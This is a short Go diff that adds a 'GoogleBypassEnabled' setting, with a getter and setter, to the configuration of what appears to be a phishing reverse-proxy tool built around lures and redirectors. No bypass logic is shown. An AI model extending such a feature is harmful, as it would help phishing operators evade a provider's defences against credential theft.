@@ -137,15 +137,16 @@ type TelegramChannel struct {
 }
 
 type GeneralConfig struct {
-	Domain          string `mapstructure:"domain" json:"domain" yaml:"domain"`
-	OldIpv4         string `mapstructure:"ipv4" json:"ipv4" yaml:"ipv4"`
-	ExternalIpv4    string `mapstructure:"external_ipv4" json:"external_ipv4" yaml:"external_ipv4"`
-	BindIpv4        string `mapstructure:"bind_ipv4" json:"bind_ipv4" yaml:"bind_ipv4"`
-	UnauthUrl       string `mapstructure:"unauth_url" json:"unauth_url" yaml:"unauth_url"`
-	HttpsPort       int    `mapstructure:"https_port" json:"https_port" yaml:"https_port"`
-	DnsPort         int    `mapstructure:"dns_port" json:"dns_port" yaml:"dns_port"`
-	Autocert        bool   `mapstructure:"autocert" json:"autocert" yaml:"autocert"`
-	InternalAPIPort int    `mapstructure:"internal_api_port" json:"internal_api_port" yaml:"internal_api_port"`
+	Domain              string `mapstructure:"domain" json:"domain" yaml:"domain"`
+	OldIpv4             string `mapstructure:"ipv4" json:"ipv4" yaml:"ipv4"`
+	ExternalIpv4        string `mapstructure:"external_ipv4" json:"external_ipv4" yaml:"external_ipv4"`
+	BindIpv4            string `mapstructure:"bind_ipv4" json:"bind_ipv4" yaml:"bind_ipv4"`
+	UnauthUrl           string `mapstructure:"unauth_url" json:"unauth_url" yaml:"unauth_url"`
+	HttpsPort           int    `mapstructure:"https_port" json:"https_port" yaml:"https_port"`
+	DnsPort             int    `mapstructure:"dns_port" json:"dns_port" yaml:"dns_port"`
+	Autocert            bool   `mapstructure:"autocert" json:"autocert" yaml:"autocert"`
+	InternalAPIPort     int    `mapstructure:"internal_api_port" json:"internal_api_port" yaml:"internal_api_port"`
+	GoogleBypassEnabled bool   `mapstructure:"google_bypass_enabled" json:"google_bypass_enabled" yaml:"google_bypass_enabled"`
 }
 
 type Config struct {
@@ -574,6 +575,13 @@ func (c *Config) GetTelegramConfig() *TelegramConfig {
 	return c.telegramConfig
 }
 
+func (c *Config) GetGoogleBypassEnabled() bool {
+	if c.general == nil {
+		return false
+	}
+	return c.general.GoogleBypassEnabled
+}
+
 func (c *Config) IsLureHostnameValid(hostname string) bool {
 	for _, l := range c.lures {
 		if l.Hostname == hostname {
@@ -638,6 +646,13 @@ func (c *Config) SetSiteHidden(site string, hide bool) error {
 
 func (c *Config) SetRedirectorsDir(path string) {
 	c.redirectorsDir = path
+}
+
+func (c *Config) SetGoogleBypassEnabled(enabled bool) {
+	if c.general == nil {
+		c.general = &GeneralConfig{}
+	}
+	c.general.GoogleBypassEnabled = enabled
 }
 
 func (c *Config) ResetAllSites() {
